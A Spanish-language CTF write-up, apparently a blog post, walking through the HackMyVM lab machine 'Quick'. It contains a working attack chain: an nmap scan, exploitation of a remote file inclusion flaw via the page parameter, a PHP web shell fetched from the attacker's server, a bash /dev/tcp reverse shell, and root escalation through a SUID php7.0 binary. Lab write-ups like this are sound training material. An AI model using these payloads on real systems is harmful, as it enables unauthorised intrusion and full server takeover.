---
layout: post
title: HackMyVM - Quick
author: c4rta
date: 2024-01-29
tags: [HackMyVM, RFI]
image: /assets/img/quick/wall.jpg
---

## Enumeracion

Iniciamos con un escaneo de nmap donde encontraremos el puerto 80(HTTP)

```ruby
nmap -sS -n -Pn --open -p- 192.168.1.88
```
- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

 - n: para que no haga resolucion DNS y tarde menos el escaneo

 - Pn: para evitar el descubrimiento de hosts

 - open: para que solo muestre los puertos abiertos

 - -p-: para que escanee todo el rango de puertos

```ruby
PORT   STATE SERVICE
80/tcp open  http
```

## Explorando el sitio web 

No pondre la parte donde hice directory fuzzing por que lo unico interesante que encontraremos es un archivo llamado **connect.php** pero no sera de utilidad.

Si exploramos el sito web podemos ver que tenemos un navbar con varias opciones, donde al seleccionar una, se incluye la pagina seleccionada, como se ve en la imagen

![](/assets/img/quick/1.png)

Igual si vemos el codigo fuente podemos ver lo mismo:

```html
<nav>
        <ul>
            <li><a href="index.php?page=home">Home</a></li>
            <li><a href="index.php?page=cars">Cars</a></li>
            <li><a href="index.php?page=maintenance_and_repair">Maintenance & Repair</a></li>
            <li><a href="index.php?page=about">About</a></li>
            <li><a href="index.php?page=contact">Contact</a></li>
        </ul>
    </nav>
```

Cuando tenemos casos asi de que se incluyen paginas y que ademas se pueda ver en la URL, como nuestro caso (index.php?page=cars), es un indicio para probar LFI (Local File Inclusion) o RFI (Remote File Inclusion)

(En este caso no es vulnerable a LFI, al menos hasta donde probe)

## Explotacion (RFI - Remote File Inclusion)

**RFI**: Remote File Inclusion es una vulnerabilidad que permite incluir archivos externos y/o remotos al servidor web

Como mencione, la idea es lograr incluir archivos externos, por lo que, para probar, podemos crearnos un servidor web con python  y ver si recibimos una peticion de la maquina victima

```bash
python3 -m http.server 8080
```
Ahora en la URL del sitio web pondremos:

```ruby
http://192.168.1.88/index.php?page=http://192.168.1.73:8080/
```

Y nos llega una peticion:

![](/assets/img/quick/2.png)

Oberva que en la peticion que hizo, esta esperando por archivos con extension .php: **GET /.php HTTP/1.0**

Ahora para poder "subir" una web shell debemos de hacer lo mismo, pero indicarle un archivo php que queremos, en mi caso creare este:

```php
<?php system($_GET[cmd]); ?>
```
Y observa como se realizo la peticion correctamente

![](/assets/img/quick/3.png)

Pareciera que el archivo se incluyo, y que accediendo a: **http://192.168.1.88/shell.php** lo podremos ejecutar, pero en realidad no, debemos de hacerlo desde la misma URL de la siguiente forma

```ruby
http://192.168.1.88/index.php?page=http://192.168.1.73:8080/shell&cmd=id
```
Y hemos conseguido RCE

![](/assets/img/quick/4.png)

Ahora nos enviaremos una reverse shell con bash

```ruby
http://192.168.1.88/index.php?page=http://192.168.1.73:8080/shell&cmd=bash -c "bash -i >%26 /dev/tcp/<tu_ip>/443 0>%261"
```

![](/assets/img/quick/5.png)

En este punto podemos leer la flag de user del directorio del usuario **andrew** ya que tiene permisos de lectura para otros

![](/assets/img/quick/6.png)

## Escalada de privilegios

Si buscamos por binarios SUID encontraremos el PHP 7.0:

```bash
find / -perm -u=s -type f 2>/dev/null

/usr/bin/php7.0
```

Haciendo una pequeña busqueda en GFTOBins  encontraremos una forma de hacernos root ingresando esto:

```bash
sudo install -m =xs $(which php) .

CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```
Pero no es necesario, lo unico que debemos de ejecutar es 

```bash
/usr/bin/php7.0 -r "pcntl_exec('/bin/bash', ['-p']);"
```

Ya seremos root y podemos leer la flag

![](/assets/img/quick/7.png)

Eso ha sido todo, gracias por leer ❤